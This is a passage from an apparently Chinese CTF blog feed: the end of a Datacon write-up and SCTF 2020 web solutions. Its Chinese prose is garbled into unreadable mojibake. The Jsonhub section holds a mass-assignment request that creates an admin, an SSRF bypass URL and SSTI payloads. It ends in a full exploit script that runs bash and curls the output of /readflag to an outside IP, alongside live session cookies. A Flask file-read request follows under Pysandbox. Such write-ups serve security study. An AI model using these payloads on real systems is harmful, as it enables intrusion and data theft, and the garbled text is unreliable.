æ‰¾å‡ºå‰©ä½™çš„å—æ„ŸæŸ“ IPã€‚</li></ol><p>æ‰€ä»¥é¢˜ç›®æ­£è§£è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li>åˆ†ææ¼æ´ï¼Œæ‰¾åˆ° bypass WAFæ–¹å¼ã€‚</li><li>é€šè¿‡expï¼Œæå–æ”»å‡»æµé‡ï¼Œè·å¾—å››ä¸ªIPã€‚</li><li>åˆ†æELFè¡Œä¸ºï¼Œå» passivedns é‡Œæ‰¾å‡ºå‰©ä¸‹çš„ IPã€‚</li></ol><p>åé¢åˆ†æ ELF éƒ¨åˆ†æˆ‘æ²¡æœ‰åšäº†ï¼Œè¯¦ç»†å¯è§é˜¿é‡Œäº‘å®‰å…¨çš„ writeupï¼š<a href="https://zhuanlan.zhihu.com/p/186254809?utm_source=wechat_session&utm_medium=social&utm_oi=771453567763492864&utm_content=sec&wechatShare=2&s_r=0">https://zhuanlan.zhihu.com/p/186254809?utm_source=wechat_session&amp;utm_medium=social&amp;utm_oi=771453567763492864&amp;utm_content=sec&amp;wechatShare=2&amp;s_r=0</a></p><p>ä¸è¿‡é¢˜ç›®è¿˜æ˜¯æœ‰ä¸€äº›æŠ•æœºå–å·§çš„åŠæ³•çš„ï¼Œå¯ä»¥æŠŠæ‰€æœ‰ä¸Šä¼ elfçš„æµé‡éƒ½æ‹–ä¸‹æ¥ï¼Œå°±60å¤šä¸ªipä¼ äº†elfï¼Œç„¶åå¯ä»¥äººå·¥åˆ†æä¸€æ³¢ï¼Œåº”è¯¥å°±ä¸¤ç§æµé‡ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æ— æ³• bypass WAFçš„æƒ…å†µä¸‹æ‰¾åˆ°æ”»å‡»æµé‡ã€‚è¿™ç§æ–¹æ³•æœ€åä¹Ÿæ²¡æœ‰å µæ­»ï¼Œç•™ä¸€ç§trickçš„åšé¢˜æ–¹æ³•23333ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬æ¬¡èµ›é¢˜è¯„ä¼°è¿˜æ˜¯å­¦åˆ°äº†ä¸å°‘ä¸œè¥¿çš„ã€‚</p><ol><li>å‹‰å¼ºç®—æ˜¯å…¥äº†é—¨é€†å‘orz</li><li>sample3 è¿™ä¸ªé€†æ¨æ€è·¯æ¯”è¾ƒæ–°é¢–ï¼ŒCTFçš„å¯†ç å­¦é¢˜ç›®ä¹Ÿæ²¡æ¥è§¦è¿‡è¿™ç±»</li><li>å¤§æ•°æ®æµé‡çš„åˆ†æï¼Œé æ‰‹å·¥å’Œ python è„šæœ¬åˆ†æä¸å¤Ÿæ–¹ä¾¿ï¼Œå…¥åº“æ“ä½œè¿˜æ˜¯æ¯”è¾ƒèˆ’æœ</li><li>å­¦ä¹ äº† xgoahead bypass WAFçš„å§¿åŠ¿ï¼Œå…¶å®åˆ†æé‚£ä¸ªæ¼æ´éœ€è¦åŠ¨æ€è°ƒ Cï¼Œè‡ªå·±ä¹Ÿä¸å¤ªç†Ÿ</li><li>â€¦</li></ol><p>çœ‹åˆ°ä»Šå¹´ Datacon åœ†æ»¡ç»“æŸï¼Œå¸Œæœ›å¤§å®¶ä¹Ÿèƒ½åœ¨è¿™æ¬¡ Datacon ä¸­æœ‰æ‰€æ”¶è·ï¼</p>]]></content>
      
      
      
        <tags>
            
            <tag> Datacon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 SCTF éƒ¨åˆ†wp</title>
      <link href="/2020/07/06/2020-SCTF/"/>
      <url>/2020/07/06/2020-SCTF/</url>
      
        <content type="html"><![CDATA[<p>Syclover æ¯”è¾ƒè‰¯å¿ƒï¼Œæ¯”èµ›ç»“æŸä¸ä¹…å°±æ”¾å‡ºäº† docker ä¸ wpï¼š<a href="https://github.com/SycloverSecurity/SCTF2020">https://github.com/SycloverSecurity/SCTF2020</a>ã€‚è·Ÿç€å¤ç°å­¦ä¹ ä¸€ä¸‹ã€‚</p><a id="more"></a><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="CloudDisk"><a href="#CloudDisk" class="headerlink" title="CloudDisk"></a>CloudDisk</h2><p>å‚è€ƒï¼š<a href="https://github.com/dlau/koa-body/issues/75">https://github.com/dlau/koa-body/issues/75</a>ã€‚</p><p>flagåœ¨å½“å‰ç›®å½•ä¸‹ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-8f0ae75ab256e48f.png" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-9e25d7938f052509.png" alt="image.png"></p><h2 id="Jsonhub"><a href="#Jsonhub" class="headerlink" title="Jsonhub"></a>Jsonhub</h2><p>ä¸»è¦å‚è€ƒï¼š<a href="https://evi0s.com/2020/07/06/sctf-2020-web-writeup/">https://evi0s.com/2020/07/06/sctf-2020-web-writeup/</a>ã€‚</p><p>ç»™äº†dockerï¼Œåˆ†ææºç ã€‚</p><p>æˆ‘ä»¬éœ€è¦getshellï¼Œweb2 é‡Œæœ‰ä¸ªæ˜æ˜¾çš„ SSTIï¼Œä½†æ˜¯ web2 å¼€åœ¨é»˜è®¤çš„ 5000 ç«¯å£æ²¡æœ‰æ˜ å°„å‡ºæ¥ï¼Œæ˜¾ç„¶æ˜¯é€šè¿‡ web1 è¿›è¡Œ SSRFã€‚web1 ä¸­ rpcå¯ä»¥å‘å‡º post è¯·æ±‚ï¼Œä½†æ˜¯éœ€è¦æœ¬åœ°è®¿é—®ï¼Œ/home è·¯ç”±æä¾›äº†ä¸€ä¸ª SSRF çš„åŠŸèƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å¾ˆæ¸…æ™°äº†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;homeå¤„SSRF -&gt; flask_rpcå¤„SSRFè¯·æ±‚web2 -&gt; web2å¤„SSTI getshell</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸­é—´æœ‰å¾ˆå¤šé˜»ç¢ï¼š</p><ol><li>æˆ‘ä»¬éœ€è¦æ‹¿åˆ° tokenï¼Œæ‰å¯ä»¥ä½¿ç”¨ /home å¤„çš„ SSRF åŠŸèƒ½ï¼›</li><li>/home çš„ SSRF å¯¹ ip é™åˆ¶ä¸º 39.104.19.182ï¼Œè€Œæˆ‘ä»¬è¦ 127.0.0.1ï¼Œéœ€è¦bypassï¼›</li><li>web2 å¯¹ SSTI è¿›è¡Œäº†è¿‡æ»¤ï¼Œéœ€è¦ç»•è¿‡ <code>before_request</code> ä¸æ­£åˆ™ã€‚</li></ol><h3 id="è·å–-token"><a href="#è·å–-token" class="headerlink" title="è·å– token"></a>è·å– token</h3><p>å¯ä»¥å‘ç°ï¼Œç™»é™† admin å¯ä»¥æ‹¿åˆ° tokenã€‚</p><p>é—®é¢˜å‡ºåœ¨æ³¨å†Œè¿™é‡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;templates/reg.html&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.body)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">-1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request data can&#x27;t be unmarshal&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(User.objects.<span class="built_in">filter</span>(username=data[<span class="string">&quot;username&quot;</span>])) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        User.objects.create_user(**data)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">0</span>&#125;)</span><br></pre></td></tr></table></figure><p>æŠŠ json loads ä¹‹åå…¨éƒ¨ä¼ è¿›äº† create_userï¼Œå¯¼è‡´ <a href="https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html">Mass Assignment vulnerability</a>ã€‚</p><p>æœ¬åœ°å‰ªä¸ª admin è´¦æˆ·ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@8eb21982749e:/app/web1<span class="comment"># python3 manage.py createsuperuser --username=admin --email=admin@qq.com</span></span><br><span class="line">Password:</span><br><span class="line">Password (again):</span><br><span class="line">Superuser created successfully.</span><br><span class="line">MariaDB [django]&gt; select * from auth_user;</span><br><span class="line">+----+--------------------------------------------------------------------------------+----------------------------+--------------+----------+------------+-----------+--------------+----------+-----------+----------------------------+</span><br><span class="line">| id | password                                                                       | last_login                 | is_superuser | username | first_name | last_name | email        | is_staff | is_active | date_joined                |</span><br><span class="line">+----+--------------------------------------------------------------------------------+----------------------------+--------------+----------+------------+-----------+--------------+----------+-----------+----------------------------+</span><br><span class="line">|  1 | pbkdf2_sha256<span class="variable">$100000</span><span class="variable">$3xAODJylgYga</span><span class="variable">$G9hPEnmyXyCpNV9QUl16746Ga01bEXODvtK7XkflG80</span>= | 2020-07-05 13:14:38.941645 |            0 | gml      |            |           |              |        0 |         1 | 2020-07-05 13:10:43.134720 |</span><br><span class="line">|  3 | pbkdf2_sha256<span class="variable">$100000</span><span class="variable">$BnspmrIUg8nT</span><span class="variable">$vgQIE6</span>+vsVv/v0lqdp42coSGikFkPKrFpD1++IdJv0k= | NULL                       |            1 | admin    |            |           | admin@qq.com |        1 |         1 | 2020-07-07 02:50:19.953829 |</span><br></pre></td></tr></table></figure><p>ç…§ç€è¿™äº›ï¼Œä¼ è¿›å»å¤šä¸ª fieldsï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/reg/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 39.104.19.182</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json;charset=utf-8</span><br><span class="line"><span class="attribute">Referer</span>: http://39.104.19.182/reg/</span><br><span class="line"><span class="attribute">Content-Length</span>: 71</span><br><span class="line"><span class="attribute">Cookie</span>: sessionid=2clv87e4e3id9dxtsm86yn2x58vusr34; csrftoken=LaC7AyOPVLKhhZ6ZP3NNiBcSjTa7f27SQ22vpuWyWRtI6LqWYrwLkFcv8EDeL7PY</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;gmlgml&quot;,&quot;password&quot;:&quot;gmlgml&quot;,&quot;is_superuser&quot;:1,&quot;is_staff&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æ³¨å†Œäº†ä¸ª admin çš„è´¦æˆ·ï¼Œç„¶å/admin ç™»é™†ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-9d636832635b6f82.png" alt="image.png"></p><p>å¯ä»¥æ‹¿åˆ° tokenã€‚</p><h3 id="SSRF-Whit-list-bypass"><a href="#SSRF-Whit-list-bypass" class="headerlink" title="SSRF Whit_list bypass"></a>SSRF Whit_list bypass</h3><p>è¿‡æ»¤çš„å¾ˆæ­»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssrf_check</span>(<span class="params">url ,white_list</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(white_list)):</span><br><span class="line">        <span class="keyword">if</span> url.startswith(<span class="string">&quot;http://&quot;</span> + white_list[i] + <span class="string">&quot;/&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>Django==2.0.7 çš„ç‰ˆæœ¬ï¼Œæœ‰ä¸ª <a href="https://xz.aliyun.com/t/3302">CVE-2018-14574</a>ï¼Œå¯ä»¥ bypass è¿™ä¸ªè¿‡æ»¤ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.104.19.182&#x2F;&#x2F;127.0.0.1:8000&#x2F;rpc?</span><br></pre></td></tr></table></figure><p>å¯ä»¥è¯·æ±‚ rpcäº†ã€‚</p><h3 id="SSTI-bypass"><a href="#SSTI-bypass" class="headerlink" title="SSTI bypass"></a>SSTI bypass</h3><p>é¦–å…ˆæœ‰ä¸ª WAFï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span>():</span></span><br><span class="line">    data = <span class="built_in">str</span>(request.data)</span><br><span class="line">    log()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#123;&#123;&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;&#125;&#125;&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;&#123;%&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;%&#125;&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">        abort(<span class="number">401</span>)</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯ jsonï¼Œæ”¯æŒ \u ç¼–ç ï¼Œç›´æ¥ç¼–ç å°±å¯ä»¥ç»•è¿‡ã€‚è¿™ä¸ªç‚¹åœ¨ 2018 å¹´ HCTF çš„ Kzone å‡ºç°è¿‡ï¼Œå½“æ—¶æ˜¯éé¢„æœŸï¼Œç”¨ \u ç¼–ç ç»•è¿‡äº†æ‰€æœ‰çš„sqlæ³¨å…¥çš„è¿‡æ»¤ã€‚</p><p>è¿˜æœ‰ä¸ªæ­£åˆ™ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> re.search(<span class="string">&quot;[a-z]&quot;</span>, num1, re.I) <span class="keyword">or</span> re.search(<span class="string">&quot;[a-z]&quot;</span>, num2, re.I) <span class="keyword">or</span> <span class="keyword">not</span> re.search(<span class="string">&quot;[+\-*/]&quot;</span>, symbols):</span><br><span class="line">        <span class="keyword">return</span> json.dumps(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">-1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;?&quot;</span>&#125;)</span><br></pre></td></tr></table></figure><p>num1 å’Œ num2 ä¸èƒ½å‡ºç°è‹±æ–‡å­—ç¬¦ã€‚å› ä¸ºè¿™æ˜¯åœ¨è§£ç åäº†ï¼Œæ²¡æ³•ç”¨ json ç¼–ç ç»•è¿‡ã€‚</p><p>ä½¿ç”¨ Python 8 è¿›åˆ¶è½¬ä¹‰å­—ç¬¦ç»•è¿‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> âœ˜ âš™ î‚° ~ î‚° python3</span><br><span class="line">Python <span class="number">3.7</span><span class="number">.4</span> (default, Jul  <span class="number">9</span> <span class="number">2019</span>, <span class="number">18</span>:<span class="number">13</span>:<span class="number">23</span>)</span><br><span class="line">[Clang <span class="number">10.0</span><span class="number">.1</span> (clang<span class="number">-1001.0</span><span class="number">.46</span><span class="number">.4</span>)] on darwin</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;\123&#x27;</span></span><br><span class="line"><span class="string">&#x27;S&#x27;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ç§æ–¹å¼ä»…ä»…å¯ä»¥æ¸²æŸ“å‡ºå­—ç¬¦ï¼Œç±»ä¼¼ä½¿ç”¨ <code>.</code>æ¥è¿›è¡Œæ–¹æ³•è°ƒç”¨ï¼Œæ¯”å¦‚ os.popenï¼Œè¿™ç§éƒ½æ˜¯æ— æ•ˆçš„ï¼Œæœ‰äº›å¯ä»¥é€šè¿‡ [â€˜popenâ€™] è¿™ç§å¼•ç”¨è¿™ç§æ–¹æ³•è¿›è¡Œç»•è¿‡ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„ SSTI RCEäº†ï¼Œè¿™ä¸ªé¢˜æ¯”è¾ƒå¥‡æ€ªï¼Œæˆ‘æ˜æ˜éƒ½æ„é€ å‡ºäº† system æ–¹æ³•ï¼Œä½†æ˜¯æ‰§è¡Œå‘½ä»¤ä¸å¯ä»¥ï¼Œpopen æˆ‘ç”¨äº†å‡ ç§æ–¹å¼ä¹Ÿæ˜¯ä¸è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;[&#39;__class__&#39;][&#39;__bases__&#39;][0][&#39;__subclasses__&#39;]()[117][&#39;__init__&#39;][&#39;__globals__&#39;][&#39;popen&#39;](&#39;ls&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªpayload è¿˜å¯ä»¥ï¼Œä½†æ˜¯å°†å‘½ä»¤æ¢æˆ <code>pwd</code>å°±æŠ¥é”™äº†ï¼Œç¥å¥‡â€¦</p><p>æœ€åç”¨çš„ subprocess ä¸­çš„ Popenï¼Œå°†æ•°æ®å¤–å¸¦ï¼Œä¹Ÿæ˜¯å„ç§ä¸è¡Œã€‚æœ€åç»ˆäºè°ƒå¥½äº†ä¸ªèƒ½ç”¨çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#123; &#125;[&#39;__class__&#39;][&#39;__mro__&#39;][1][&#39;__subclasses__&#39;]()[409]([&#39;bash&#39;,&#39;-c&#39;,&#39;curl vps&#x2F;&#96;&#x2F;readflag&#96;&#39;])&#125;&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œæµ‹è¯•ï¼ŒåŠ  port éƒ½ä¸è¡Œï¼Œæˆ–è€… curl åé¢åŠ ä¸ª http:// ä¹Ÿä¼šGGï¼ŒçœŸæ˜¯ç„å­¦ã€‚</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bypass</span>(<span class="params">s</span>):</span></span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">            tmp += <span class="string">&quot;\%o&quot;</span> % (<span class="built_in">ord</span>(c))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp += c</span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span>.join([<span class="string">&quot;\u00%s&quot;</span> % (c.encode(<span class="string">&quot;hex&quot;</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> tmp])</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">payload</span>):</span></span><br><span class="line">    base_url = <span class="string">&quot;http://39.104.19.182//127.0.0.1:8000/rpc?methods=POST&amp;url=http://127.0.0.1:5000/caculator&amp;data=%s&quot;</span></span><br><span class="line">    base_json = <span class="string">&#x27;&#123;&quot;num1&quot;:&quot;%s&quot;,&quot;num2&quot;:&quot;1&quot;,&quot;symbols&quot;:&quot;-&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = base_json % bypass(payload)</span><br><span class="line">    <span class="built_in">print</span> json.loads(payload)</span><br><span class="line">    exp = base_url % b64encode(payload)</span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    rawBody = <span class="string">&quot;&#123;\&quot;token\&quot;:\&quot;3ad9af405504233188f694a11ff22115\&quot;,\&quot;url\&quot;:\&quot;%s\&quot;&#125;&quot;</span> % exp</span><br><span class="line">    headers = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://39.104.19.182/home/&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json;charset=utf-8&quot;</span>&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&quot;csrftoken&quot;</span>: <span class="string">&quot;LaC7AyOPVLKhhZ6ZP3NNiBcSjTa7f27SQ22vpuWyWRtI6LqWYrwLkFcv8EDeL7PY&quot;</span>,</span><br><span class="line">               <span class="string">&quot;sessionid&quot;</span>: <span class="string">&quot;dzwa097pfn3fxuk00rfcb3rof2yb7djt&quot;</span>&#125;</span><br><span class="line">    proxies = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line">    response = session.post(<span class="string">&quot;http://39.104.19.182/home/&quot;</span>, data=rawBody, headers=headers, cookies=cookies,</span><br><span class="line">                            proxies=proxies)</span><br><span class="line">    <span class="keyword">return</span> response.content</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># payload = &quot;&#123;&#123;()[&#x27;__class__&#x27;][&#x27;__bases__&#x27;][0][&#x27;__subclasses__&#x27;]()[93][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;sys&#x27;]&#125;&#125;&quot;</span></span><br><span class="line">    <span class="comment"># payload = &quot;&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__bases__&#x27;][0][&#x27;__subclasses__&#x27;]()[117][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;popen&#x27;](&#x27;ls&#x27;)&#125;&#125;&quot; ## å¯ä»¥å¾—åˆ° popenï¼Œpayloadå¤±è´¥</span></span><br><span class="line">    <span class="comment"># payload = &quot;&#123;&#123;&#x27;ac&#x27;[&#x27;__class__&#x27;][&#x27;__mro__&#x27;][1][&#x27;__subclasses__&#x27;]()[226][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;os&#x27;][&#x27;system&#x27;]&#125;&#125;&quot; ##å¯ä»¥å¾—åˆ° osï¼Œpayloadå¤±è´¥</span></span><br><span class="line">    payload = <span class="string">&quot;&#123;&#123; &#123; &#125;[&#x27;__class__&#x27;][&#x27;__mro__&#x27;][1][&#x27;__subclasses__&#x27;]()[409]([&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;curl htt://123.207.149.181/`/readflag`&#x27;])&#125;&#125;&quot;</span></span><br><span class="line">    <span class="built_in">print</span> exp(payload)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Pysandbox"><a href="#Pysandbox" class="headerlink" title="Pysandbox"></a>Pysandbox</h2><p>åšé¢˜çš„æ—¶å€™æ€è·¯æ€»æ˜¯å±€é™åœ¨ Python ç»•è¿‡æ‹¬å·è°ƒç”¨æ–¹æ³•ï¼Œå…¶å®è¿™æ˜¯ä¸è¡Œçš„ã€‚ã€‚ã€‚æ€è·¯è¿˜æ˜¯å¤ªåƒµç¡¬äº†ã€‚</p><p>å¯ä»¥æŠŠ flask staticçš„ç›®å½•è®¾ç½®æˆ /ï¼Œè¿™æ ·å°±ä»»æ„ä¸‹è½½æ–‡ä»¶äº†ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?POST=%3f</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 39.104.25.107:10009</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 50</span><br><span class="line"></span><br><span class="line">cmd=app.static_folder=request.args[request.method]</span><br></pre></td></tr></table></figure><p>ä¸èƒ½ç”¨å­—ç¬¦ï¼Œå°±å‡‘ä¸€ä¸ªå­—ç¬¦ä¸²å‡ºæ¥ã€‚ç„¶åè®¿é—® /static/app/flagã€‚</p><h2 id="Pysandbox2"><a href="#Pysandbox2" class="headerlink" title="Pysandbox2"></a>Pysandbox2</h2><p>éœ€è¦ RCEã€‚çœ‹äº† WP å¸ˆå‚…ä»¬çš„æ€è·¯éƒ½ tqlã€‚æ„Ÿè§‰æœ€éªšçš„æ˜¯æŠŠ ord å‡½æ•°ç»™æ”¹äº†â€¦ ç›´æ¥æŠŠ waf å¹²äº†ï¼Œå‚è€ƒï¼š<a 